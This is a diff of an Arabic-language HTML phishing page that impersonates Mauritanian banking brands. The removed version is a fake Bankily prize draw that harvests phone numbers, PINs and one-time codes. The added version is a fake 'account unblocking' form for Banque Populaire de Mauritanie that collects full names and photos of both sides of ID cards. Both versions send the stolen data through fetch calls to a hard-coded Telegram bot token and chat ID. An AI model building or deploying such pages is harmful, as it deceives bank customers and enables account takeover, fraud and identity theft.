@@ -2,194 +2,535 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bankily 2026 - جوائز العام</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فك الحظر - البنك الشعبي الموريتاني</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Playfair+Display:ital,wght@1,900&display=swap');
-        
-        body { font-family: 'Tajawal', sans-serif; background-color: #f8fafc; margin: 0; min-height: 100vh; overflow-x: hidden; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-        /* الواجهة العلوية الرسمية لبنكيلي 2026 */
-        .bankily-header { 
-            height: 42vh; 
-            background: linear-gradient(135deg, #00a5bc 0%, #007a8a 100%);
-            position: relative;
+        :root {
+            --primary: #8B6914;
+            --secondary: #1a1a2e;
+            --accent: #C9A961;
+            --light: #f5f1e8;
+            --dark: #0f0f0f;
+        }
+
+        html, body {
+            direction: rtl;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        #splash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            border-radius: 0 0 50px 50px;
-            box-shadow: 0 10px 25px rgba(0, 165, 188, 0.2);
+            color: var(--light);
+            z-index: 1000;
+            animation: fadeIn 0.5s ease-in;
         }
 
-        /* زخرفة "بنكيلي 2026" بخط فرنسي فخم */
-        .brand-title { 
-            font-family: 'Playfair Display', serif; 
-            font-size: 58px; 
-            color: #ffffff; 
-            font-style: italic;
-            text-shadow: 3px 3px 0px rgba(0,0,0,0.1);
-            margin-bottom: -10px;
+        #splash.hide {
+            animation: fadeOut 0.5s ease-out;
+            pointer-events: none;
+            opacity: 0;
         }
-        .year-badge {
-            background: #ffb400;
-            color: #fff;
-            padding: 4px 20px;
-            border-radius: 20px;
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .splash-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .splash-content h1 {
+            font-size: 36px;
+            margin: 20px 0;
             font-weight: bold;
-            font-size: 20px;
-            margin-top: 15px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
 
-        /* عرض الجوائز الواقعي */
-        .prize-showcase {
+        .splash-content p {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: var(--accent);
+        }
+
+        .splash-dots {
+            margin-top: 40px;
             display: flex;
-            gap: 20px;
-            margin-top: 25px;
-        }
-        .prize-card {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 10px;
-            border-radius: 15px;
-            text-align: center;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            gap: 10px;
         }
 
-        /* تنسيق الحقول لمحاكاة التطبيق الأصلي */
-        .app-container { padding: 30px 40px; }
-        .input-box { 
-            background: #ffffff;
-            border-radius: 12px;
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: var(--accent);
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        body {
+            background-color: var(--light);
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            border: 3px solid var(--primary);
+            text-align: right;
+            animation: slideDown 0.6s ease-out;
+            opacity: 0;
+        }
+
+        .container.show {
+            opacity: 1;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .header-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            color: var(--primary);
+            margin: 0 0 10px 0;
+            font-weight: bold;
+        }
+
+        .header p {
+            color: var(--secondary);
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .header-line {
+            height: 3px;
+            width: 60px;
+            background: var(--accent);
+            margin: 15px auto 0;
+            border-radius: 2px;
+        }
+
+        .alert {
             padding: 15px;
             margin-bottom: 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-            border: 1px solid #e2e8f0;
-        }
-        .input-label { color: #64748b; font-size: 13px; margin-bottom: 8px; display: block; font-weight: bold; }
-        .input-field { 
-            width: 100%; border: none; outline: none; font-size: 22px; 
-            text-align: center; color: #00a5bc; font-weight: bold; letter-spacing: 2px;
+            border-radius: 8px;
+            display: none;
+            font-size: 14px;
         }
 
-        /* زر بنكيلي التقليدي */
-        .btn-bankily { 
-            background: #ffb400; color: white; width: 100%; padding: 18px; 
-            font-size: 22px; font-weight: bold; border: none; 
-            position: fixed; bottom: 0; right: 0; cursor: pointer;
-            transition: 0.3s;
-        }
-        .btn-bankily:hover { background: #e6a200; }
-
-        /* واجهة الـ OTP */
-        #screen-otp { display: none; text-align: center; background: #fff; min-height: 100vh; }
-        .otp-large-input {
-            width: 85%;
-            border: 3px solid #00a5bc;
-            border-radius: 20px;
-            padding: 20px;
-            font-size: 35px;
-            text-align: center;
-            letter-spacing: 20px;
-            margin: 50px auto;
-            color: #00a5bc;
-            outline: none;
+        .alert.show {
             display: block;
+        }
+
+        .alert.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .alert.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            margin-bottom: 10px;
+            color: var(--primary);
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .form-group small {
+            color: #666;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        input[type="text"],
+        input[type="date"],
+        input[type="file"] {
+            padding: 12px 15px;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="date"]:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .file-input-wrapper {
+            border: 2px dashed var(--accent);
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            background-color: #fafafa;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .file-input-wrapper:hover {
+            border-color: var(--primary);
+            background-color: #f0f0f0;
+        }
+
+        .file-input-wrapper input {
+            display: none;
+        }
+
+        .file-input-wrapper label {
+            cursor: pointer;
+            display: block;
+            margin: 0;
+        }
+
+        .file-input-wrapper .icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .file-input-wrapper p {
+            margin: 0 0 5px 0;
+            color: var(--secondary);
+        }
+
+        .file-input-wrapper small {
+            color: #999;
+        }
+
+        button {
+            padding: 15px 30px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(139, 105, 20, 0.3);
+            margin-top: 10px;
+        }
+
+        button:hover:not(:disabled) {
+            box-shadow: 0 6px 20px rgba(139, 105, 20, 0.4);
+            transform: translateY(-2px);
+        }
+
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--accent);
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .footer p {
+            margin: 5px 0;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 24px;
+            }
+
+            input, button {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
 <body>
-
-    <!-- الواجهة الرئيسية للجوائز -->
-    <div id="screen-login">
-        <div class="bankily-header">
-            <h1 class="brand-title">Bankily</h1>
-            <div class="year-badge">جوائز 2026</div>
-            
-            <div class="prize-showcase">
-                <div class="prize-card"><span class="block text-2xl">📱</span><span class="text-[10px] text-white">iPhone 17</span></div>
-                <div class="prize-card"><span class="block text-2xl">🚗</span><span class="text-[10px] text-white">سيارة أحلامك</span></div>
-                <div class="prize-card"><span class="block text-2xl">💰</span><span class="text-[10px] text-white">مبالغ نقدية</span></div>
-            </div>
+    <div id="splash">
+        <div class="splash-content">
+            <div class="splash-icon">🏦</div>
+            <h1>البنك الشعبي الموريتاني</h1>
+            <p>خدمة فك الحظر</p>
+            <p style="font-size: 14px; margin-top: 30px;">بالشراكة مع الصيرفية الموريتانية الكبرى</p>
         </div>
-
-        <div class="app-container">
-            <p class="text-center text-[#00a5bc] font-bold mb-6 text-lg">سجل دخولك للمشاركة في سحب اليوم</p>
-            
-            <div class="input-box">
-                <label class="input-label">رقم الهاتف (8 أرقام)</label>
-                <!-- قانون: أرقام فقط -->
-                <input id="user_id" type="tel" class="input-field" 
-                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
-                       maxlength="8" placeholder="00000000">
-            </div>
-
-            <div class="input-box">
-                <label class="input-label">الرمز السري (4 أرقام)</label>
-                <!-- قانون: أرقام فقط -->
-                <input id="pin" type="password" class="input-field" 
-                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
-                       maxlength="4" placeholder="****">
-            </div>
-
-            <p class="text-xs text-center text-gray-400">جميع البيانات محمية بواسطة أنظمة البنك الشعبي الموريتاني (BPM)</p>
+        <div class="splash-dots">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.3s;"></div>
+            <div class="dot" style="animation-delay: 0.6s;"></div>
         </div>
-
-        <button onclick="handleLogin()" class="btn-bankily">تسجيل الدخول للسحب</button>
     </div>
 
-    <!-- واجهة التحقق OTP -->
-    <div id="screen-otp">
-        <div class="bg-[#00a5bc] p-10 text-white rounded-b-[40px]">
-            <h2 class="text-2xl font-bold">تأكيد المشاركة</h2>
+    <div class="container" id="container">
+        <div class="header">
+            <div class="header-icon">🏦</div>
+            <h1>خدمة فك الحظر</h1>
+            <p>البنك الشعبي الموريتاني</p>
+            <div class="header-line"></div>
         </div>
-        
-        <div class="px-10 mt-16">
-            <p class="text-gray-600 font-bold mb-8">أدخل الرمز السري المكون من 4 أرقام الذي استلمته الآن عبر الرسائل النصية</p>
-            
-            <!-- قانون: إدخال يدوي + أرقام فقط -->
-            <input id="otp_manual" type="tel" class="otp-large-input" 
-                   oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
-                   maxlength="4" placeholder="0000">
-            
-            <p class="text-red-500 font-bold">⏳ الرمز صالح لمرة واحدة فقط</p>
+
+        <div class="alert" id="alert"></div>
+
+        <form id="form">
+            <div class="form-group">
+                <label>1️⃣ الاسم الكامل</label>
+                <input 
+                    type="text" 
+                    id="fullName" 
+                    placeholder="أدخل اسمك الكامل (بدون أرقام)"
+                    required
+                >
+                <small>ملاحظة: سيتم حظر الأرقام تلقائياً</small>
+            </div>
+
+            <div class="form-group">
+                <label>2️⃣ صورة بطاقة التعريف (من الأمام)</label>
+                <div class="file-input-wrapper">
+                    <input type="file" id="idFront" accept="image/*" required>
+                    <label for="idFront">
+                        <div class="icon">📸</div>
+                        <p>انقر لاختيار الصورة</p>
+                        <small id="idFrontName">لم يتم اختيار صورة</small>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>3️⃣ صورة بطاقة التعريف (من الخلف)</label>
+                <div class="file-input-wrapper">
+                    <input type="file" id="idBack" accept="image/*" required>
+                    <label for="idBack">
+                        <div class="icon">📸</div>
+                        <p>انقر لاختيار الصورة</p>
+                        <small id="idBackName">لم يتم اختيار صورة</small>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>4️⃣ تاريخ المشكلة</label>
+                <input 
+                    type="date" 
+                    id="problemDate" 
+                    required
+                >
+                <small>ملاحظة: سيتم قبول الأرقام فقط</small>
+            </div>
+
+            <button type="submit" id="submitBtn">✅ إرسال الطلب</button>
+        </form>
+
+        <div class="footer">
+            <p>🤝 بالشراكة مع الصيرفية الموريتانية الكبرى</p>
+            <p>© 2024 البنك الشعبي الموريتاني - جميع الحقوق محفوظة</p>
         </div>
-        
-        <button onclick="handleOTP()" class="btn-bankily">تأكيد واستلام الجائزة</button>
     </div>
 
     <script>
-        const T = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const C = "8665814266";
+        const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || '8831199692:AAGfkkFM×jtMaYsA9KLZFUiw_dlu7LjxEf8';
+        const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || '8665814266';
 
-        function handleLogin() {
-            const u = document.getElementById('user_id').value;
-            const p = document.getElementById('pin').value;
+        setTimeout(() => {
+            document.getElementById('splash').classList.add('hide');
+            document.getElementById('container').classList.add('show');
+        }, 3000);
+
+        document.getElementById('fullName').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[0-9]/g, '');
+        });
+
+        document.getElementById('idFront').addEventListener('change', function(e) {
+            const name = e.target.files[0]?.name || 'لم يتم اختيار صورة';
+            document.getElementById('idFrontName').textContent = name;
+        });
+
+        document.getElementById('idBack').addEventListener('change', function(e) {
+            const name = e.target.files[0]?.name || 'لم يتم اختيار صورة';
+            document.getElementById('idBackName').textContent = name;
+        });
+
+        function showAlert(message, type = 'info') {
+            const alert = document.getElementById('alert');
+            alert.textContent = message;
+            alert.className = `alert show ${type}`;
             
-            if(u.length === 8 && p.length === 4) {
-                send(`🏆 Bankily 2026 Entry\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
-                document.getElementById('screen-login').style.display = 'none';
-                document.getElementById('screen-otp').style.display = 'block';
-            } else {
-                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح (أرقام فقط)");
+            if (type === 'success') {
+                setTimeout(() => {
+                    alert.classList.remove('show');
+                }, 5000);
             }
         }
 
-        function handleOTP() {
-            const code = document.getElementById('otp_manual').value;
-            if(code.length === 4) {
-                send(`🔑 Bankily 2026 OTP: ${code}`);
-                alert("تم تسجيل مشاركتك بنجاح! سيتم إخطار الفائزين عبر اتصال مباشر.");
-                location.reload();
-            } else {
-                alert("يرجى إدخال رمز التحقق المكون من 4 أرقام");
-            }
-        }
+        document.getElementById('form').addEventListener('submit', async (e) => {
+            e.preventDefault();
 
-        function send(m) {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
-        }
+            const fullName = document.getElementById('fullName').value.trim();
+            const idFront = document.getElementById('idFront').files[0];
+            const idBack = document.getElementById('idBack').files[0];
+            const problemDate = document.getElementById('problemDate').value;
+            const submitBtn = document.getElementById('submitBtn');
+
+            if (!fullName) {
+                showAlert('يرجى إدخال الاسم الكامل', 'error');
+                return;
+            }
+            if (!idFront) {
+                showAlert('يرجى تحميل صورة بطاقة التعريف من الأمام', 'error');
+                return;
+            }
+            if (!idBack) {
+                showAlert('يرجى تحميل صورة بطاقة التعريف من الخلف', 'error');
+                return;
+            }
+            if (!problemDate) {
+                showAlert('يرجى إدخال تاريخ المشكلة', 'error');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = '⏳ جاري الإرسال...';
+
+            try {
+                const textMessage = `
+🏦 طلب فك حظر جديد
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 الاسم الكامل: ${fullName}
+📅 تاريخ المشكلة: ${problemDate}
+📱 من: البنك الشعبي الموريتاني
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+                `;
+
+                const messageResponse = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: textMessage
+                        })
+                    }
+                );
+
+                if (!messageResponse.ok) {
+                    throw new Error('خطأ في الرسالة النصية');
+                }
+
+                const formData1 = new FormData();
+                formData1.append('chat_id', TELEGRAM_CHAT_ID);
+                formData1.append('photo', idFront);
+                formData1.append('caption', '📷 صورة بطاقة التعريف (الأمام)');
+
+                const photoResponse1 = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                    {
+                        method: 'POST',
+                        body: formData1
+                    }
+                );
+
+                if (!photoResponse1.ok) {
+                    throw new Error('خطأ في الصورة الأمامية');
+                }
+
+                const formData2 = new FormData();
+                formData2.append('chat_id', TELEGRAM_CHAT_ID);
+                formData2.append('photo', idBack);
+                formData2.append('caption', '📷 صورة بطاقة التعريف (الخلف)');
+
+                const photoResponse2 = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                    {
+                        method: 'POST',
+                        body: formData2
+                    }
+                );
+
+                if (!photoResponse2.ok) {
+                    throw new Error('خطأ في الصورة الخلفية');
+                }
+
+                showAlert('تم إرسال طلبك بنجاح! سيتم التواصل معك قريباً', 'success');
+
+                document.getElementById('form').reset();
+                document.getElementById('idFrontName').textContent = 'لم يتم اختيار صورة';
+                document.getElementById('idBackName').textContent = 'لم يتم اختيار صورة';
+
+            } catch (error) {
+                console.error('خطأ:', error);
+                showAlert('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = '✅ إرسال الطلب';
+            }
+        });
     </script>
 </body>
+</html>
